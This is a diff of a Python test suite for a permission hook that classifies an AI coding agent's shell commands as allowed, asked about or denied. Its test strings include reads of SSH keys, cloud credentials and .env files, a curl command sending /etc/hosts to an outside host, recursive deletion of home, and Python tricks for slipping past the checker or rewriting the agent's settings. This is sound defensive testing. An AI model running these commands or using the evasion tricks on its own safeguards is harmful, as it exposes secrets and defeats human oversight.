-         "python3 - <<'EOF'\nimport fractions\nprint(fractions.operator.attrgetter('x'))\nEOF"),
-        ("a re-exported module imported", "python3 - <<'EOF'\nfrom fractions import operator\nprint(1)\nEOF"),
-        ("a module passed around", "python3 - <<'EOF'\nimport fractions\nm = fractions\nprint(m)\nEOF"),
-        ("a re-exported module down a chain", "python3 - <<'EOF'\nimport urllib.parse\nprint(urllib.parse.types)\nEOF"),
-        ("a submodule a from-import loads", "python3 - <<'EOF'\nfrom json import tool\nprint(callable(tool.main))\nEOF"),
-        ("a module passed through a name", "python3 - <<'EOF'\nimport urllib.parse\np = urllib.parse\nprint(p.types.SimpleNamespace)\nEOF"),
-        ("a def rebound by a match capture",
-         "python3 - <<'EOF'\ndef f(x):\n    return x\nmatch 1:\n    case f:\n        pass\nprint(f(1))\nEOF"),
-        ("a def rebound by an except name",
-         "python3 - <<'EOF'\ndef f(x):\n    return x\ntry:\n    pass\nexcept Exception as f:\n    pass\nprint(f(1))\nEOF"),
-        ("a def rebound by an import", "python3 - <<'EOF'\ndef f(x):\n    return x\nfrom math import sqrt as f\nprint(f(4))\nEOF"),
-        ("tab stripping", "python3 - <<-'EOF'\n" + body + 'EOF'),
-        ("no end line", "python3 - <<'EOF'\n" + body),
-        ("-X option", "python3 -X dev - <<'EOF'\n" + body + 'EOF'),
-        ("-x skips a line", "python3 -x - <<'EOF'\n" + body + 'EOF'),
-        ("PYTHONPATH", "PYTHONPATH=/tmp/x python3 - <<'EOF'\n" + body + 'EOF'),
-        ("exported startup var", "export PYTHONSTARTUP=/tmp/x; python3 - <<'EOF'\n" + body + 'EOF'),
-        ("utf-7 source", "python3 - <<'EOF'\n# -*- coding: utf-7 -*-\nprint(1)\nEOF"),
-        ("a write", "python3 - <<'EOF'\nopen('x', 'w').write('1')\nEOF"),
-        ("a run-time path", "python3 - <<'EOF'\nimport sys\nprint(open(sys.argv[1]).read())\nEOF"),
-        ("a sensitive path", "python3 - <<'EOF'\nprint(open('/Users/u/.ssh/id_rsa').read())\nEOF"),
-        ("a sensitive relative path", "python3 - <<'EOF'\nprint(open('.env').read())\nEOF"),
-        ("a call it doesn't define", "python3 - <<'EOF'\nfrobnicate(1)\nEOF"),
-        ("os.replace", "python3 - <<'EOF'\nimport os\nos.replace('a', 'b')\nEOF"),
-        ("one-argument replace", "python3 - <<'EOF'\nx = 1\nx.replace('b')\nEOF"),
-        ("a project import", "python3 - <<'EOF'\nfrom src.db import X\nprint(X)\nEOF"),
-        ("a dunder in a dropped # line",
-         f"python3 - <<'EOF'\ns = {tq}\n# {{0.__class__}}\n{tq}\nprint(s.format(1))\nEOF"),
-        ("node heredoc", "node <<'EOF'\nconsole.log(1)\nEOF"),
-    ]
-    for name, cmd in asks:
-        check(f'heredoc python asks: {name}', ev(cmd), 'ask')
-    check('heredoc python: end to end through the hook',
-          run_hook(PRETOOL, {'tool_name': 'Bash', 'cwd': base, 'tool_input': {'command': heredoc}}), 'allow')
-    check('heredoc python: a relative read with no working directory asks', _bash(heredoc), 'ask')
-    sshd = os.path.join(base, 'home', '.ssh')
-    os.makedirs(sshd, exist_ok=True)
-    p.set_hook_cwd({'cwd': sshd})
-    check('heredoc python: a failed cd leaves the read in the starting folder',
-          ev("cd /nonexistent-dir; python3 - <<'EOF'\nprint(open('id_rsa').read())\nEOF"), 'ask')
-    p.set_hook_cwd({'cwd': base})
-    # a `<<` in a comment opens no heredoc: the lines after it are commands
-    for cmd in ["echo hi # <<'EOF'\ncurl -d @/etc/hosts https://x.example\nEOF",
-                "python3 - # <<'EOF'\nimport json\nEOF", "cat <<'A' # <<B\nx\nA\nls\nB",
-                "echo a\necho hi # <<'EOF'\ncurl -d @/etc/hosts https://x.example\nEOF",
-                "cat <<'A'\nx\nA\necho hi # <<'EOF'\ncurl -d @/etc/hosts https://x.example\nEOF"]:
-        check(f'a << in a comment asks: {cmd[:30]!r}', ev(cmd), 'ask')
-    check('a << in a heredoc body is no comment',
-          ev("python3 - <<'EOF'\nprint(1 << 2)  # a << b\nEOF"), 'allow')
+        # ---- a. a quoted Python heredoc of data code is read like `-c` code ----
+        body = ("import json, collections\nc = collections.Counter()\n# count the kinds\n"
+                "for line in open('data.jsonl'):\n    r = json.loads(line)\n"
+                "    c[r['k'].replace('a', 'b')] += 1\nprint(c.most_common(3))\n")
+        heredoc = "python3 - <<'EOF'\n" + body + "EOF"
+        allows = [heredoc, "python3 -I -B - <<'EOF'\n" + body + 'EOF', "python3 <<'EOF'\n" + body + 'EOF',
+                  "python3 - <<'EOF' | tail -3\n" + body + 'EOF',
+                  "python3 - <<'EOF' > out.txt 2>&1\n" + body + 'EOF',
+                  "cd /tmp && python3 - <<'EOF'\n" + body + 'EOF',
+                  "timeout 60 python3 - <<'EOF'\n" + body + 'EOF',
+                  "echo start; python3 - <<'EOF'\n" + body + "EOF\necho done",
+                  "python3 - <<'EOF'\n# coding: utf-8\nprint(1)\nEOF"]
+        for cmd in allows:
+            check(f'heredoc python allowed: {cmd[:40]!r}', ev(cmd), 'allow')
+        tq = "'" * 3
+        asks = [
+            ("unquoted delimiter", "python3 - <<EOF\n" + body + 'EOF'),
+            ("a pipe into it too", "cat x | python3 - <<'EOF'\n" + body + 'EOF'),
+            ("a pipe into its group", "cat x | { python3 - <<'EOF'\n" + body + 'EOF\n}'),
+            ("a second stdin", "python3 - <<'EOF' < other.py\n" + body + 'EOF'),
+            ("a second stdin written on", "python3 - <<'EOF'<other.py\n" + body + 'EOF'),
+            ("a here-string written on", "python3 - <<'EOF'<<<'print(2)'\n" + body + 'EOF'),
+            ("a second stdin after a redirect", "python3 - <<'EOF'>o.txt<other.py\n" + body + 'EOF'),
+            ("uuid.getnode runs programs", "python3 - <<'EOF'\nimport uuid\nprint(uuid.getnode())\nEOF"),
+            ("stdin duplicated from another fd", "python3 - <<'EOF' 0>&3\n" + body + 'EOF'),
+            ("a field looked up by a built name",
+             "python3 - <<'EOF'\nimport string\nk = '_' * 2 + 'init' + '_' * 2\n"
+             "print(string.Formatter().get_field('0.' + k, [1], {})[0])\nEOF"),
+            ("a computed call target", "python3 - <<'EOF'\nd = {'a': len}\nprint(d['a']('x'))\nEOF"),
+            ("a callable held in a name", "python3 - <<'EOF'\nf = len\nprint(f('x'))\nEOF"),
+            ("a builtin name rebound", "python3 - <<'EOF'\nprint = len\nprint('x')\nEOF"),
+            ("a frame's builtins", "python3 - <<'EOF'\ndef g():\n    yield 1\nprint(g().gi_frame)\nEOF"),
+            ("a module another module re-exports",
+             "python3 - <<'EOF'\nimport fractions\nprint(fractions.operator.attrgetter('x'))\nEOF"),
+            ("a re-exported module imported", "python3 - <<'EOF'\nfrom fractions import operator\nprint(1)\nEOF"),
+            ("a module passed around", "python3 - <<'EOF'\nimport fractions\nm = fractions\nprint(m)\nEOF"),
+            ("a re-exported module down a chain", "python3 - <<'EOF'\nimport urllib.parse\nprint(urllib.parse.types)\nEOF"),
+            ("a submodule a from-import loads", "python3 - <<'EOF'\nfrom json import tool\nprint(callable(tool.main))\nEOF"),
+            ("a module passed through a name", "python3 - <<'EOF'\nimport urllib.parse\np = urllib.parse\nprint(p.types.SimpleNamespace)\nEOF"),
+            ("a def rebound by a match capture",
+             "python3 - <<'EOF'\ndef f(x):\n    return x\nmatch 1:\n    case f:\n        pass\nprint(f(1))\nEOF"),
+            ("a def rebound by an except name",
+             "python3 - <<'EOF'\ndef f(x):\n    return x\ntry:\n    pass\nexcept Exception as f:\n    pass\nprint(f(1))\nEOF"),
+            ("a def rebound by an import", "python3 - <<'EOF'\ndef f(x):\n    return x\nfrom math import sqrt as f\nprint(f(4))\nEOF"),
+            ("tab stripping", "python3 - <<-'EOF'\n" + body + 'EOF'),
+            ("no end line", "python3 - <<'EOF'\n" + body),
+            ("-X option", "python3 -X dev - <<'EOF'\n" + body + 'EOF'),
+            ("-x skips a line", "python3 -x - <<'EOF'\n" + body + 'EOF'),
+            ("PYTHONPATH", "PYTHONPATH=/tmp/x python3 - <<'EOF'\n" + body + 'EOF'),
+            ("exported startup var", "export PYTHONSTARTUP=/tmp/x; python3 - <<'EOF'\n" + body + 'EOF'),
+            ("utf-7 source", "python3 - <<'EOF'\n# -*- coding: utf-7 -*-\nprint(1)\nEOF"),
+            ("a write", "python3 - <<'EOF'\nopen('x', 'w').write('1')\nEOF"),
+            ("a run-time path", "python3 - <<'EOF'\nimport sys\nprint(open(sys.argv[1]).read())\nEOF"),
+            ("a sensitive path", "python3 - <<'EOF'\nprint(open('/Users/u/.ssh/id_rsa').read())\nEOF"),
+            ("a sensitive relative path", "python3 - <<'EOF'\nprint(open('.env').read())\nEOF"),
+            ("a call it doesn't define", "python3 - <<'EOF'\nfrobnicate(1)\nEOF"),
+            ("os.replace", "python3 - <<'EOF'\nimport os\nos.replace('a', 'b')\nEOF"),
+            ("one-argument replace", "python3 - <<'EOF'\nx = 1\nx.replace('b')\nEOF"),
+            ("a project import", "python3 - <<'EOF'\nfrom src.db import X\nprint(X)\nEOF"),
+            ("a dunder in a dropped # line",
+             f"python3 - <<'EOF'\ns = {tq}\n# {{0.__class__}}\n{tq}\nprint(s.format(1))\nEOF"),
+            ("node heredoc", "node <<'EOF'\nconsole.log(1)\nEOF"),
+        ]
+        for name, cmd in asks:
+            check(f'heredoc python asks: {name}', ev(cmd), 'ask')
+        check('heredoc python: end to end through the hook',
+              run_hook(PRETOOL, {'tool_name': 'Bash', 'cwd': base, 'tool_input': {'command': heredoc}}), 'allow')
+        check('heredoc python: a relative read with no working directory asks', _bash(heredoc), 'ask')
+        sshd = os.path.join(base, 'home', '.ssh')
+        os.makedirs(sshd, exist_ok=True)
+        call_state.cwd = sshd
+        check('heredoc python: a failed cd leaves the read in the starting folder',
+              ev("cd /nonexistent-dir; python3 - <<'EOF'\nprint(open('id_rsa').read())\nEOF"), 'ask')
+        call_state.cwd = base
+        # a `<<` in a comment opens no heredoc: the lines after it are commands
+        for cmd in ["echo hi # <<'EOF'\ncurl -d @/etc/hosts https://x.example\nEOF",
+                    "python3 - # <<'EOF'\nimport json\nEOF", "cat <<'A' # <<B\nx\nA\nls\nB",
+                    "echo a\necho hi # <<'EOF'\ncurl -d @/etc/hosts https://x.example\nEOF",
+                    "cat <<'A'\nx\nA\necho hi # <<'EOF'\ncurl -d @/etc/hosts https://x.example\nEOF"]:
+            check(f'a << in a comment asks: {cmd[:30]!r}', ev(cmd), 'ask')
+        check('a << in a heredoc body is no comment',
+              ev("python3 - <<'EOF'\nprint(1 << 2)  # a << b\nEOF"), 'allow')
 
-    # the tighter read check (inline -c too): literal, statically known paths only
-    sp = p._safe_python_code
-    for code in ["import json\nfor f in ['a.json', 'b.json']:\n    print(json.load(open(f)))",
-                 "for n in ['a', 'b']:\n    print(open(f'dir/{n}.json').read())",
-                 "print([open(f).read() for f in ('a.txt', 'b.txt')])",
-                 "p = 'x/y.txt'\nprint(open(p).read())", "print(open('/tmp/x.txt').read())",
-                 "print('a-b'.replace('-', '+'))"]:
-        check(f'python read allowed: {code[:40]!r}', sp(code), True)
-    for code in ["p = 'x'\np = '/Users/u/.ssh/id_rsa'\nprint(open(p).read())",
-                 "for f in ['a', '/Users/u/.aws/credentials']:\n    print(open(f).read())",
-                 "for f in ['a']:\n    f += 'x'\n    print(open(f).read())",
-                 "import sys\nfor f in sys.argv[1:]:\n    print(open(f).read())",
-                 "for n in ['a']:\n    print(open(f'{n!r}').read())",
-                 "def g(f):\n    return open(f).read()\nfor f in ['a']:\n    print(g(f))",
-                 "f = 'a'\ndef g():\n    global f\n    f = '/Users/u/.ssh/id_rsa'\ng()\nprint(open(f).read())",
-                 "print(open('$f').read())", "print(open(input()).read())",
-                 "import json\nprint(json.request)", "open('/tmp/x', opener=None)"]:
-        check(f'python read asks: {code[:40]!r}', sp(code), False)
-    p.set_hook_cwd({'cwd': base})
-    check('relative read with a known folder', ev('python3 -c "print(open(\'f.txt\').read())"'), 'allow')
-    check('relative read after a cd that may not happen',
-          ev('cd "$X" && python3 -c "print(open(\'f.txt\').read())"'), 'ask')
-    check('relative sensitive read after a cd',
-          ev('cd ~/.ssh && python3 -c "print(open(\'id_rsa\').read())"'), 'ask')
-    # `$HOME` and literal names in the -c code are written out before the read check
-    for cmd, want in [
-            ("S=/tmp/work; python3 -c \"import json; print(json.load(open('$S/a.json')))\"", 'allow'),
-            ("S=/tmp/work && python3 -c \"import json\nprint(open('$S/a.json').read())  # x\"", 'allow'),
-            ("python3 -c \"print(open('$HOME/work/a.json').read())\"", 'allow'),
-            ("python3 -c \"print(open('$HOME/.ssh/id_rsa').read())\"", 'ask'),
-            ("S=/Users/u/.aws; python3 -c \"print(open('$S/credentials').read())\"", 'ask'),
-            ("python3 -c \"print(open('$S/a.json').read())\"", 'ask'),
-            ("test -d x && S=/tmp/w; python3 -c \"print(open('$S/a.json').read())\"", 'ask'),
-            ("S=/tmp/w; python3 -c 'print(open(\"$S/a.json\").read())'", 'ask'),
-            ("HOME=/x; python3 -c \"print(open('$HOME/a.json').read())\"", 'ask'),
-            ("S=/tmp/w; S=/Users/u/.ssh; python3 -c \"print(open('$S/id').read())\"", 'ask')]:
-        check(f'inline read with a shell name: {cmd[:50]!r}', ev(cmd), want)
+        # the tighter read check (inline -c too): literal, statically known paths only
+        sp = p._safe_python_code
+        for code in ["import json\nfor f in ['a.json', 'b.json']:\n    print(json.load(open(f)))",
+                     "for n in ['a', 'b']:\n    print(open(f'dir/{n}.json').read())",
+                     "print([open(f).read() for f in ('a.txt', 'b.txt')])",
+                     "p = 'x/y.txt'\nprint(open(p).read())", "print(open('/tmp/x.txt').read())",
+                     "print('a-b'.replace('-', '+'))"]:
+            check(f'python read allowed: {code[:40]!r}', sp(code), True)
+        for code in ["p = 'x'\np = '/Users/u/.ssh/id_rsa'\nprint(open(p).read())",
+                     "for f in ['a', '/Users/u/.aws/credentials']:\n    print(open(f).read())",
+                     "for f in ['a']:\n    f += 'x'\n    print(open(f).read())",
+                     "import sys\nfor f in sys.argv[1:]:\n    print(open(f).read())",
+                     "for n in ['a']:\n    print(open(f'{n!r}').read())",
+                     "def g(f):\n    return open(f).read()\nfor f in ['a']:\n    print(g(f))",
+                     "f = 'a'\ndef g():\n    global f\n    f = '/Users/u/.ssh/id_rsa'\ng()\nprint(open(f).read())",
+                     "print(open('$f').read())", "print(open(input()).read())",
+                     "import json\nprint(json.request)", "open('/tmp/x', opener=None)"]:
+            check(f'python read asks: {code[:40]!r}', sp(code), False)
+        call_state.cwd = base
+        check('relative read with a known folder', ev('python3 -c "print(open(\'f.txt\').read())"'), 'allow')
+        check('relative read after a cd that may not happen',
+              ev('cd "$X" && python3 -c "print(open(\'f.txt\').read())"'), 'ask')
+        check('relative sensitive read after a cd',
+              ev('cd ~/.ssh && python3 -c "print(open(\'id_rsa\').read())"'), 'ask')
+        # `$HOME` and literal names in the -c code are written out before the read check
+        for cmd, want in [
+                ("S=/tmp/work; python3 -c \"import json; print(json.load(open('$S/a.json')))\"", 'allow'),
+                ("S=/tmp/work && python3 -c \"import json\nprint(open('$S/a.json').read())  # x\"", 'allow'),
+                ("python3 -c \"print(open('$HOME/work/a.json').read())\"", 'allow'),
+                ("python3 -c \"print(open('$HOME/.ssh/id_rsa').read())\"", 'ask'),
+                ("S=/Users/u/.aws; python3 -c \"print(open('$S/credentials').read())\"", 'ask'),
+                ("python3 -c \"print(open('$S/a.json').read())\"", 'ask'),
+                ("test -d x && S=/tmp/w; python3 -c \"print(open('$S/a.json').read())\"", 'ask'),
+                ("S=/tmp/w; python3 -c 'print(open(\"$S/a.json\").read())'", 'ask'),
+                ("HOME=/x; python3 -c \"print(open('$HOME/a.json').read())\"", 'ask'),
+                ("S=/tmp/w; S=/Users/u/.ssh; python3 -c \"print(open('$S/id').read())\"", 'ask')]:
+            check(f'inline read with a shell name: {cmd[:50]!r}', ev(cmd), want)
 
-    # ---- c. a name bound only when the and-chain before it succeeds ----
-    os.environ.pop('SPTESTPY', None)
-    for cmd, want in [('cd /tmp && PY=/usr/bin/python3; $PY -I x.py', 'allow'),
-                      # (a heredoc in the command keeps every name unproven, as before)
-                      ("cd /tmp && PY=/usr/bin/python3; $PY - <<'EOF'\nprint(1)\nEOF", 'ask'),
-                      ('cd /tmp && L=ls; $L', 'allow'),
-                      ('cd /tmp && PY=/usr/bin/python3; $PY tools/x.py', 'allow'),
-                      ('cd /tmp && G=git; $G status', 'ask'),           # unset: `status` runs
-                      ('cd /tmp && L=ls; $L $L', 'ask'),                 # read twice
-                      ('cd /tmp || PY=/usr/bin/python3; $PY -I x.py', 'ask'),
-                      ('cd /tmp && PY=/usr/bin/python3 && G=git; $PY -I x.py', 'ask'),
-                      (f'cd /tmp && R=rm; $R {rmrf[3:]} ~', 'deny'),
-                      ("cat x | { cd /tmp && PY=/usr/bin/python3; $PY - <<'EOF'\nprint(1)\nEOF\n}", 'ask')]:
-        check(f'conditional name: {cmd[:50]!r}', ev(cmd), want)
-    os.environ['SPTESTPY'] = '/bin/sh'
-    check('conditional name the environment may already hold',
-          ev('cd /tmp && SPTESTPY=/usr/bin/python3; $SPTESTPY -I x.py'), 'ask')
-    os.environ.pop('SPTESTPY', None)
+        # ---- c. a name bound only when the and-chain before it succeeds ----
+        os.environ.pop('SPTESTPY', None)
+        for cmd, want in [('cd /tmp && PY=/usr/bin/python3; $PY -I x.py', 'allow'),
+                          # (a heredoc in the command keeps every name unproven, as before)
+                          ("cd /tmp && PY=/usr/bin/python3; $PY - <<'EOF'\nprint(1)\nEOF", 'ask'),
+                          ('cd /tmp && L=ls; $L', 'allow'),
+                          ('cd /tmp && PY=/usr/bin/python3; $PY tools/x.py', 'allow'),
+                          ('cd /tmp && G=git; $G status', 'ask'),           # unset: `status` runs
+                          ('cd /tmp && L=ls; $L $L', 'ask'),                 # read twice
+                          ('cd /tmp || PY=/usr/bin/python3; $PY -I x.py', 'ask'),
+                          ('cd /tmp && PY=/usr/bin/python3 && G=git; $PY -I x.py', 'ask'),
+                          (f'cd /tmp && R=rm; $R {rmrf[3:]} ~', 'deny'),
+                          ("cat x | { cd /tmp && PY=/usr/bin/python3; $PY - <<'EOF'\nprint(1)\nEOF\n}", 'ask')]:
+            check(f'conditional name: {cmd[:50]!r}', ev(cmd), want)
+        os.environ['SPTESTPY'] = '/bin/sh'
+        check('conditional name the environment may already hold',
+              ev('cd /tmp && SPTESTPY=/usr/bin/python3; $SPTESTPY -I x.py'), 'ask')
+        os.environ.pop('SPTESTPY', None)
 
-    # ---- d. read-only CLI calls; secrets, writes and exec stay with the judge ----
-    for cmd, want in [
-            ('glab api projects/1/merge_requests', 'allow'),
-            ('glab api --paginate -X GET projects/1/pipelines?per_page=5', 'allow'),
-            ('glab api --method=GET projects/1/issues', 'allow'), ('glab --version', 'allow'),
-            ('glab api -X POST projects/1/issues', 'ask'), ('glab api --method=put projects/1', 'ask'),
-            ('glab api projects/1/issues -f title=x', 'ask'), ('glab api -F a=@f projects/1', 'ask'),
-            ('glab api --input body.json projects/1', 'ask'), ('glab api -H X:1 projects/1', 'ask'),
-            ('glab api "projects/$P/issues"', 'ask'), ('glab api graphql', 'ask'),
-            ('glab api a b', 'ask'), ('glab variable get TOKEN', 'ask'),
-            ('glab api --hostname gitlab.example.com projects/1/issues', 'allow'),
-            ('glab api --hostname $H projects/1', 'ask'), ('glab api projects/1/variables', 'ask'),
-            ('glab api groups/2/variables/KEY', 'ask'), ('glab api projects/1/%76ariables', 'ask'),
-            ('glab api projects/1/access_tokens', 'ask'), ('glab api user/keys', 'ask'),
-            ('glab api projects/1/{variables,}', 'ask'), ('glab api projects/1/variable[[:alpha:]]', 'ask'),
-            ('terraform output $F', 'ask'), ('docker -c compose compose exec web sh', 'ask'),
-            ('docker-compose logs compose run', 'allow'), ('docker compose logs compose run', 'allow'),
-            ('docker-compose exec compose sh', 'ask'), ('docker --context=x compose run w', 'ask'),
-            ('glab api projects/:id/pipelines', 'allow'), ('glab api projects/example:branch/x', 'ask'), ('glab api projects/:id/repository/branches/:branch', 'ask'),
-            ('TF_CLI_ARGS_output=-json terraform output', 'ask'),
-            ('docker compose logs run', 'allow'), ('docker compose -p run logs', 'allow'),
-            ('docker compose -p logs exec web sh', 'ask'), ('docker compose --weird logs exec web', 'ask'),
-            ('terraform output', 'allow'), ('terraform output vpc_id', 'allow'),
-            ('terraform output -raw db_password', 'ask'), ('terraform output -json', 'ask'),
-            ('terraform output --raw=true x', 'ask'),
-            ('terraform show', 'allow'), ('terraform show -json', 'ask'), ('terraform console', 'ask'),
-            ('docker compose ps', 'allow'), ('docker compose logs web', 'allow'),
-            ('docker compose exec web sh', 'ask'), ('docker compose -f d.yml run --rm web ls', 'ask'),
-            ('docker-compose exec db psql', 'ask'),
-            ('az monitor log-analytics workspace list -g rg', 'allow'),
-            ('az cognitiveservices account deployment show -n a -g rg --deployment-name d', 'allow'),
-            ('az acr repository show-tags -n reg --repository app', 'allow'),
-            ('az containerapp ingress traffic show -n app -g rg', 'allow'),
-            ('az keyvault secret show --vault-name v -n s', 'ask'),
-            ('az webapp config appsettings list -n app -g rg', 'ask'),
-            ('az containerapp exec -n app -g rg', 'ask'), ('ssh host ls', 'ask'),
-            ('/usr/local/bin/script -q /dev/null ls', 'ask')]:
-        check(f'CLI: {cmd!r}', ev(cmd), want)
-    check('conditional name: an option word on PATH is a command',
-          ev('export PATH=/tmp/b:$PATH; cd /tmp && PY=/usr/bin/python3; $PY -I x.py'), 'ask')
+        # ---- d. read-only CLI calls; secrets, writes and exec stay with the judge ----
+        for cmd, want in [
+                ('glab api projects/1/merge_requests', 'allow'),
+                ('glab api --paginate -X GET projects/1/pipelines?per_page=5', 'allow'),
+                ('glab api --method=GET projects/1/issues', 'allow'), ('glab --version', 'allow'),
+                ('glab api -X POST projects/1/issues', 'ask'), ('glab api --method=put projects/1', 'ask'),
+                ('glab api projects/1/issues -f title=x', 'ask'), ('glab api -F a=@f projects/1', 'ask'),
+                ('glab api --input body.json projects/1', 'ask'), ('glab api -H X:1 projects/1', 'ask'),
+                ('glab api "projects/$P/issues"', 'ask'), ('glab api graphql', 'ask'),
+                ('glab api a b', 'ask'), ('glab variable get TOKEN', 'ask'),
+                ('glab api --hostname gitlab.example.com projects/1/issues', 'allow'),
+                ('glab api --hostname $H projects/1', 'ask'), ('glab api projects/1/variables', 'ask'),
+                ('glab api groups/2/variables/KEY', 'ask'), ('glab api projects/1/%76ariables', 'ask'),
+                ('glab api projects/1/access_tokens', 'ask'), ('glab api user/keys', 'ask'),
+                ('glab api projects/1/{variables,}', 'ask'), ('glab api projects/1/variable[[:alpha:]]', 'ask'),
+                ('terraform output $F', 'ask'), ('docker -c compose compose exec web sh', 'ask'),
+                ('docker-compose logs compose run', 'allow'), ('docker compose logs compose run', 'allow'),
+                ('docker-compose exec compose sh', 'ask'), ('docker --context=x compose run w', 'ask'),
+                ('glab api projects/:id/pipelines', 'allow'), ('glab api projects/example:branch/x', 'ask'), ('glab api projects/:id/repository/branches/:branch', 'ask'),
+                ('TF_CLI_ARGS_output=-json terraform output', 'ask'),
+                ('docker compose logs run', 'allow'), ('docker compose -p run logs', 'allow'),
+                ('docker compose -p logs exec web sh', 'ask'), ('docker compose --weird logs exec web', 'ask'),
+                ('terraform output', 'allow'), ('terraform output vpc_id', 'allow'),
+                ('terraform output -raw db_password', 'ask'), ('terraform output -json', 'ask'),
+                ('terraform output --raw=true x', 'ask'),
+                ('terraform show', 'allow'), ('terraform show -json', 'ask'), ('terraform console', 'ask'),
+                ('docker compose ps', 'allow'), ('docker compose logs web', 'allow'),
+                ('docker compose exec web sh', 'ask'), ('docker compose -f d.yml run --rm web ls', 'ask'),
+                ('docker-compose exec db psql', 'ask'),
+                ('az monitor log-analytics workspace list -g rg', 'allow'),
+                ('az cognitiveservices account deployment show -n a -g rg --deployment-name d', 'allow'),
+                ('az acr repository show-tags -n reg --repository app', 'allow'),
+                ('az containerapp ingress traffic show -n app -g rg', 'allow'),
+                ('az keyvault secret show --vault-name v -n s', 'ask'),
+                ('az webapp config appsettings list -n app -g rg', 'ask'),
+                ('az containerapp exec -n app -g rg', 'ask'), ('ssh host ls', 'ask'),
+                ('/usr/local/bin/script -q /dev/null ls', 'ask')]:
+            check(f'CLI: {cmd!r}', ev(cmd), want)
+        check('conditional name: an option word on PATH is a command',
+              ev('export PATH=/tmp/b:$PATH; cd /tmp && PY=/usr/bin/python3; $PY -I x.py'), 'ask')
 
-    # ---- g. a config write needs a write ----
-    log = os.path.join(os.path.expanduser('~'), '.claude', 'hooks', 'sp-test-decisions.jsonl')
-    settings = os.path.join(os.path.expanduser('~'), '.claude', 'settings.json')
-    link = os.path.join(base, 'out.txt')
-    os.symlink(settings, link)
-    w = p.bash_writes_to_config_path
-    for name, cmd, want in [
-            ('a heredoc read, output elsewhere',
-             f"python3 - <<'E' > {base}/o.txt\nn = 0\nfor l in open('{log}'):\n    n += len(l) > 3\nprint(n)\nE",
-             False),
-            ('a -c read, output elsewhere',
-             f"python3 -c \"print(sum(1 for l in open('{log}')))\" > /tmp/o.txt", False),
-            ('a heredoc read into a pipe',
-             f"python3 - <<'E' | tail -3\nfor l in open('{log}'):\n    print(l)\nE", False),
-            ('reads of the path with os.path',
-             f"python3 - <<'E'\nimport os\nprint(os.path.getsize('{log}'), os.sep)\nE", False),
-            ('a write elsewhere beside the read',
-             f"python3 - <<'E'\nimport os\nos.makedirs('/tmp/o', exist_ok=True)\n"
-             f"open('/tmp/o/x.txt', 'w').write(open('{log}').read())\nE", False),
-            ('cat into a file', f'cat {log} > /tmp/x.txt', False),
-            ('open in write mode', f"python3 - <<'E'\nopen('{log}', 'w').write('x')\nE", True),
-            ('open r+', f"python3 -c \"open('{log}', 'r+')\"", True),
-            ('Path.write_text',
-             f"python3 - <<'E'\nfrom pathlib import Path\nPath('{settings}').write_text('x')\nE", True),
-            ('Path.write_text on ~', "python3 - <<'E'\nfrom pathlib import Path\n"
-             "Path('~/.claude/settings.json').expanduser().write_text('x')\nE", True),
-            ('os.replace onto it', f"python3 - <<'E'\nimport os\nos.replace('/tmp/a', '{log}')\nE", True),
-            ('os.replace by another name',
-             f"python3 - <<'E'\nfrom os import replace as r\nr('/tmp/a', '{log}')\nE", True),
-            ('os through another module',
-             f"python3 - <<'E'\nimport shlex\nshlex.os.replace('/tmp/a', '{log}')\nE", True),
-            ('shutil.copy onto it',
-             f"python3 - <<'E'\nimport shutil\nshutil.copy('/tmp/a', '{settings}')\nE", True),
-            ('gzip.GzipFile', f"python3 - <<'E'\nimport gzip\ngzip.GzipFile('{log}', 'wb')\nE", True),
-            ('a write to a run-time path',
-             f"python3 - <<'E'\nimport sys\nopen(sys.argv[1], 'w')\nprint(open('{log}').read())\nE", True),
-            ('a write through a name',
-             f"python3 - <<'E'\np = '/tmp/x'\nopen(p, 'w')\nprint(open('{log}').read())\nE", True),
-            ('open passed around', f"python3 - <<'E'\nimport functools\n"
-             f"f = functools.partial(open, mode='w')\nf('{log}')\nE", True),
-            ('an unseen module', f"python3 - <<'E'\nimport subprocess\nprint(open('{log}').read())\nE", True),
-            ('an unquoted heredoc', f"python3 - <<E\nprint(open('{log}').read())\nE", True),
-            ('a utf-7 heredoc', f"python3 - <<'E'\n# coding: utf-7\nprint(open('{log}').read())\nE", True),
-            ('a script file naming it', f'python3 tool.py {log}', True),
-            ('a write through a link',
-             f"python3 - <<'E'\nopen('{link}', 'w').write('x')\nprint(open('{log}').read())\nE", True),
-            ('a redirect through a link', f'echo hi > {link}', True),
-            ('a relative redirect through a link', f'cd {base} && echo hi > out.txt', True),
-            ('a redirect onto it', f"python3 - <<'E' > {log}\nprint(1)\nE", True),
-            ('os under another name', f"python3 - <<'E'\nimport os\nm = os\nm.replace('/tmp/a', '{settings}')\nE", True),
-            ('shutil in a list', f"python3 - <<'E'\nimport shutil\nfor m in [shutil]:\n    m.copy('/tmp/a', '{settings}')\nE", True),
-            ('os passed along', f"python3 - <<'E'\nimport os\n(lambda q: q.replace('/tmp/a', '{log}'))(os)\nE", True),
-            ('script runs a copy into the folder', 'script -q /dev/null cp /tmp/settings.json ~/.claude/', True),
-            ('script -c copies into the folder', 'script -q -c "cp /tmp/settings.json ~/.claude/" /dev/null', True),
-            ('script runs a harmless copy', 'script -q /dev/null cp /tmp/a /tmp/b', False),
-            ('script -c with a copy later in it', 'script -q -c "true; cp /tmp/settings.json ~/.claude/" /dev/null', True),
-            ('shutil.copy into the folder',
-             f"python3 - <<'E'\nimport shutil\nshutil.copy('/tmp/settings.json', '{os.path.dirname(settings)}/')\n"
-             f"print(open('{log}').read())\nE", True),
-            ('shutil.rmtree of a parent', f"python3 - <<'E'\nimport shutil\nshutil.rmtree('{os.path.dirname(settings)}')\n"
-             f"print(open('{log}').read())\nE", True),
-            ('Path.copy (3.14)', f"python3 - <<'E'\nfrom pathlib import Path\nPath('/tmp/s').copy('{settings}')\n"
-             f"print(open('{log}').read())\nE", True),
-            ('os re-exported by another module',
-             f"python3 - <<'E'\nfrom gzip import os as o\no.replace('/tmp/a', '{settings}')\nE", True),
-            ('a module that re-exports operator',
-             f"python3 - <<'E'\nimport fractions\nfractions.operator.methodcaller('x')\nprint(open('{log}').read())\nE", True),
-            ('a Path constructor bound again',
-             f"python3 - <<'E'\nfrom pathlib import Path\nPath = str\nPath('/tmp/a').write_text('x')\nprint(open('{log}').read())\nE", True),
-            ('Formatter.get_field reflection',
-             f"python3 - <<'E'\nimport string\nf = string.Formatter().get_field('x', [], {{}})\nprint(open('{log}').read())\nE", True),
-            ('os re-exported by os.path',
-             f"python3 - <<'E'\nfrom os.path import os as o\no.replace('/tmp/a', '{settings}')\nE", True),
